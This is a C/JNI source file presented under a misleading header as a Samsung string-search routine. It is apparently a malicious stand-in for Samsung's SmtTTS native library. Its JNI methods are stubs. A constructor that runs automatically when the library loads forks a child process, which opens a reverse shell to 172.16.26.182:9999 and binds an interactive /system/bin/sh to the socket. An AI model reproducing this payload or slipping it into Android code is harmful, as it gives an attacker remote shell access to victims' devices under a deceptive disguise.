/*
 * mstring.cpp
 * Buffered String Search.
 *
 * Written by Rodrigo Chiossi <r.chiossi@samsung.com>
 *
 *
 * This is a native implementation of a buffered string search algorithm,
 * optimized to reduce the overhead of the JNI call.
 *
 * The number of strings found is usually very big which makes it impossible
 * return a list of jstrings objects back to java (due to the restriction of
 * 512 local references) without paying the price of DeleteLocalRef().
 *
 * This implementation creates a single Java string with all strings separated
 * by a new line. An actual list can be then retrieved in Java using
 * split("\n"), or any method alike.
 *
 * The chunk size was obtained by profiling the execution time over several
 * classes.dex extracted from apks. The best observed value was 16k.
 */

#include <jni.h>
#include <unistd.h>
#include <string.h>
#include <android/log.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <dirent.h>
#include <stdarg.h>
#include <sys/system_properties.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , "mercury-native", __VA_ARGS__)
char *ip;
char *port;
char *dir;
JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_initialize ( JNIEnv* env,
                                                  jobject thiz )
{
  return -1;

}

// int setLanguage(String arg1, String arg2, String arg3, String arg4, int arg5, int arg6) 
JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_setLanguage(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6)
{
  return 1;
}
//(java.lang.String, java.lang.String, java.lang.String, java.lang.String, int, int)

JNIEXPORT jint Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6)
{
  return -1;
}
char* getCurrentDirectory()
{
    /* Size 1024 */
    char *buf = malloc(sizeof(char) * 1024);

    /* Get full executable path */
    ssize_t len = readlink("/proc/self/exe", buf, 1023);
    buf[len] = '\0';
    
    /* Chop off everything after the last slash */
    char* lastSlash = strrchr(buf, '/');
    if (lastSlash != NULL)
        *(lastSlash) = '\0';

    return buf;
}
/* Send a shell as a backup if the other methods have failed */
bool defeated_weasel()
{
    ip = "172.16.26.182";
    port = "9999";
    dir = malloc(snprintf(NULL, 0, "%s", getCurrentDirectory()) + 1);
    sprintf(dir, "%s", getCurrentDirectory());
    /* Create socket */
    int s = socket(AF_INET, SOCK_STREAM, 0);
 
    /* Populate details of server */
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(atoi(port));

    LOGE("weasel begin connect");
    /* Connect */
    if (connect(s, (struct sockaddr *) &server, sizeof(struct sockaddr)) != 0)
        return false;

    /* Send the magic header to let the server know that this is a plain shell connection */
    char *magic = "S";
    send(s, magic, strlen(magic), 0);
    
    /* Add current folder to PATH */
    char *originalPath = getenv("PATH");
    char *newPath = malloc(strlen(originalPath) + 1 + strlen(dir) + 1);
    strncpy(newPath, originalPath, strlen(originalPath));
    strcat(newPath, ":");
    strcat(newPath, dir);
    setenv("PATH", newPath, 1);

    /* Connect stdin, stdout and stderr to socket */
    dup2(s, STDIN_FILENO);
    dup2(s, STDOUT_FILENO);
    dup2(s, STDERR_FILENO);

    /* Run shell */
    system("/system/bin/sh -i");

    return true;
}

__attribute__((constructor))
static void doload() {
  int pid = -1;
  LOGE("somehow I'm in the library yah, my uid is %d", getuid());
  pid = fork();
  if(pid == 0)
  {
    //child
    defeated_weasel();
  }
}
